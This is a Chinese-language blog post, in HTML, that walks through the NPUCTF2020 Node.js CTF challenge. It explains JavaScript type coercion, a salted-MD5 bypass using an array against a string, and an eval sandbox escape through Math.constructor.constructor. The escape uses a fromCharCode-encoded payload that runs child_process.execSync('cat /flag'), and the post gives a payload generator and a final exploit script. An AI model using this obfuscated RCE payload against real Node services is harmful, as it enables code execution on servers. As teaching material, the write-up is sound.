@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码） | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h1 id="Node专题训练-1-NPUCTF2020-验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）"><a href="#Node专题训练-1-NPUCTF2020-验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）" class="headerlink" title="[Node专题训练-1]NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）"></a>[Node专题训练-1]NPUCTF2020 验证🐎-（弱类型比较、hash绕过、构造函数执行任意代码）</h1><ul>
+<li>我们用一段代码来看再JavaScript中的类型比较：</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424150332.png" alt="20200424150332"></p>
+<ul>
+<li><p>可以看到数组<code>[1]==1</code>在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。</p>
+</li>
+<li><p>而在JavaScript中各个数据类型的相加呢？</p>
+</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424162607.png" alt="20200424162607"></p>
+<p>可以看到对象和字符串相加最后得到的是字符串。而数组和字符串相加最后也是得到字符串。所以可以基本得出结论就是，<strong>node中任何数据类型和字符串相加最后得到的都是字符串</strong>。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424180609.png" alt="20200424180609"></p>
+<p>而长度<code>length</code> 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有<code>length</code> 的。</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424215524.png" alt="20200424215524"></p>
+<h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><pre><code class="javascript">app.post(&#39;/&#39;, function (req, res) {
+  let result = &#39;&#39;;
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || &#39;Wrong Wrong Wrong!!!&#39;;
+      } catch (e) {
+        console.log(e);
+        result = &#39;Wrong Wrong Wrong!!!&#39;;
+      }
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift(&#39;Not verified!&#39;);
+  }
+  if (results.length &gt; 13) {
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});</code></pre>
+<p>以这道题为例:</p>
+<h3 id="hash绕过"><a href="#hash绕过" class="headerlink" title="hash绕过"></a>hash绕过</h3><p>要满足<code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code> 结合上面的结论我们我们想要<code>first</code> 和<code>second</code> 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：</p>
+<pre><code>{&quot;e&quot;:paylod,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}</code></pre><p>这是因为数组利用了<strong>任何数据类型加上字符串都会转变称为字符串的特性</strong>。同时数组和字符串的长度都是1但是他们却不全等。</p>
+<pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+url = &quot;http://ff8efecb-b1bc-4df1-af3d-249b285a0c54.node3.buuoj.cn/&quot;
+data = {&quot;e&quot;:&#39;paylod&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
+r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p>这道题的第二关我一直没做出来,虽然看正则就知道是用math去RCE。</p>
+<h3 id="构造函数执行任意代码"><a href="#构造函数执行任意代码" class="headerlink" title="构造函数执行任意代码"></a>构造函数执行任意代码</h3><p>题目关键代码：</p>
+<pre><code class="javascript">function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, &#39;&#39;)) {
+    return null;
+  }
+  return eval(str);
+}</code></pre>
+<p>从正则可以看出只能嵌套Math而且Math只能用一个点，也就是只能用一层属性。</p>
+<p>我们再来看最终的payload:</p>
+<pre><code class="javascript">(Math=&gt;(
+    Math=Math.constructor,
+    Math.x=Math.constructor(
+        Math.fromCharCode(
+114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41)
+        )()))(Math+1)</code></pre>
+<p><code>Math=&gt;</code> 是什么意思？我们来看个简单的例子：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424231655.png" alt="20200424231655"></p>
+<p>可以发现最终是生成了个函数。是的这就是我们熟悉的匿名函数。<code>x =&gt; x * x</code> 相当于：</p>
+<pre><code class="javascript">function (x) {
+    return x * x;
+}</code></pre>
+<p>同理<code>a = x=&gt;x*x</code> 相当于命名了一个名字为a的函数：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424231946.png" alt="20200424231946"></p>
+<p>那么<code>(x=&gt;x+x)(2)</code>呢其实就相当于往这个函数里面传入参数2：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200424235002.png" alt="20200424235002"></p>
+<p>我们再回到payload本身<code>(Math=Math.constructor,Math.x=Math.constructor(......))</code> 可以清楚地看到最外层括号是一个逗号运算，而逗号运算我们知道是从左往右运算再最后返回最右边的值。我们由此得知这里是执行这么个运算：</p>
+<pre><code class="javascript">Math.constructor.constructor(.....)</code></pre>
+<p>而这又是什么呢，我们直接逐层测试的<code>Math.constructor</code> ：</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425002236.png" alt="20200425002236"></p>
+<p>可以见到第一层返回的<code>function object()</code>,他是function的对象原型，而我们知道Object的构造器是指向Function的所以第二层会出现Function。而Function是构造函数他能够创建函数。可以简单理解他和eval类似。我们可以测试一个例子：</p>
+<pre><code class="javascript">var sum = Math.constructor.constructor(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
+sum(1,2);
+var fun = new Function(&#39;a&#39;, &#39;b&#39;, &#39;return a + b&#39;);
+fun(1,2)</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425003241.png" alt="20200425003241"></p>
+<p>可以直接看到结果，<code>Math.constructor.constructor()</code> 和构造函数<code>new Function()</code> 是等效的。当然这个不知在Math中其他任意函数应该也是类似的。例如：alert()</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425003702.png" alt="20200425003702"></p>
+<p>而payload的最里面<code>fromCharCode</code>就很容易理解了就是把AIISC码转换为字符串,那么生成payload脚本如下：</p>
+<pre><code class="python">import re
+encode = lambda code: list(map(ord,code))
+decode = lambda code: &quot;&quot;.join(map(chr,code))
+a=f&quot;&quot;&quot;
+(m0=&gt;(
+        m0=m0.constructor,
+        m0.x=m0.constructor(
+            m0.fromCharCode({encode(&quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)&quot;)})
+        )()
+    ))(Math+1)
+&quot;&quot;&quot;
+a=re.sub(r&quot;[\s\[\]]&quot;, &quot;&quot;, a).replace(&quot;m0&quot;,&quot;Math&quot;)
+print(a)
+</code></pre>
+<h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><pre><code class="python">import requests
+import json
+headers = {
+    &quot;Content-Type&quot;:&quot;application/json&quot;
+}
+url = &quot;http://14b5ae3b-e444-4e5b-9e2b-1ba3100fc085.node3.buuoj.cn/&quot;
+data = {&quot;e&quot;:&#39;(Math=&gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&#39;,&quot;first&quot;:[0],&quot;second&quot;:&quot;0&quot;}
+r = requests.post(url,data=json.dumps(data),headers=headers)
+print(r.text)</code></pre>
+<p>GETFLAG:</p>
+<p><img src="http://goodcheerleung.gitee.io/blog/20200425004237.png" alt="20200425004237"></p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-04-24T16:47:35.000Z" itemprop="datePublished">2020-04-25</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
